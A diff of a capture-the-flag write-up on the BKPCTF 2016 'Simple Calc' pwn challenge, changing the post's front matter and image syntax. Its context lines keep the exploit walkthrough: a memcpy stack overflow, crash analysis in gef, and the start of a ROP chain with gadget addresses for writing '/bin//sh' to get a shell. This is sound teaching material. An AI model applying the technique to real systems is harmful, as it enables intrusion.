@@ -1,13 +1,17 @@
-title: BKPCTF 2016 - Simple Calc
-date:   2016-03-07 22:51:04 +1100
-author: hugsy
-tags:  pwn, gef, ida, bkpctf-2016, x86
-category: ctf
-modified:   2016-03-07 22:51:04 +1100
++++
+title = "BKPCTF 2016 - Simple Calc"
+date =   2016-03-07T22:51:04Z
+updated =   2016-03-07T22:51:04Z
+authors = ["hugsy"]
+
+[taxonomies]
+tags = ["pwn", "gef", "ida", "bkpctf-2016", "x86"]
+categories = ["ctf"]
++++
 
 ### Info ###
 
-```shell
+```bash
 ~/cur/simple_calc $ file b28b103ea5f1171553554f0127696a18c6d2dcf7
 b28b103ea5f1171553554f0127696a18c6d2dcf7: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
 ~/cur/simple_calc $ checksec.sh --file b28b103ea5f1171553554f0127696a18c6d2dcf7
@@ -19,7 +23,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 
 `simple_calc` offered a binary that expects us to make some calculations. It will ask for a number of calculations (say *N*) to perform and will `malloc()` *N*x4 bytes in the heap. If we decompile with [IDA](https://www.hex-rays.com/products/ida/), it'll look something like this:
 
-![vuln_in_ida](https://i.imgur.com/aFaqYf6.png)
+{{ img(src="https://i.imgur.com/aFaqYf6.png" title="vuln_in_ida") }}
 
 Then a loop of *N* iterations will commence,
 each iteration offering to perform one of the possible arithmetic operations,
@@ -28,7 +32,7 @@ which take in 2 DWORD operands, and apply the function. What is worth noticing i
 both operands and result are stored in the `.bss` (therefore at predictable
 addresses).
 
-```
+```asm
 [...]
 .bss:00000000006C4A84 add_operator_2  dd ?                    ; DATA XREF: adds+40
 .bss:00000000006C4A84                                         ; adds+69 ...
@@ -47,7 +51,7 @@ addresses).
 By exiting, `simple_calc` performs a `memcpy()` of the malloc-ed buffer (whose
 length is controlled by us) into a stack buffer (of length 0x28 bytes) located
 at $rbp+40h.
-![overflow](https://i.imgur.com/0wcLH24.png)
+{{ img(src="https://i.imgur.com/0wcLH24.png" title="overflow") }}
 
 It is then easy to spot the trivial stack buffer overflow.
 
@@ -88,7 +92,7 @@ def pwn(s):
 We execute and a SIGSEGV was well caught (as seen with
 [`gef`](https://github.com/hugsy/gef)) :
 
-![gef](https://i.imgur.com/rn4XSOR.png)
+{{ img(src="https://i.imgur.com/rn4XSOR.png" title="gef") }}
 
 However, the faulty instruction is in the `free()` following the `memcpy()` and
 yet not in the return from the main function.
@@ -115,7 +119,7 @@ def pwn(s):
 
 We try again, and we hit the SIGSEGV in the RET. Perfect, time to bypass NX.
 
-```
+```asm
 Program received signal SIGSEGV, Segmentation fault.
 [...]
 0x40157c	 <main+505>  mov    edi,eax
@@ -135,7 +139,7 @@ writable address, and write '/bin//sh' (we arbitrarily chose 0x6c3110 in the
 `.bss`). Using [`ropgadget`](https://github.com/JonathanSalwan/ROPgadget) makes
 it easier than ever:
 
-```
+```asm
 0x401c87:                  # pop rsi ; ret
 0x6c3110:                  # our writable address
 0x44db34:                  # pop rax ; ret
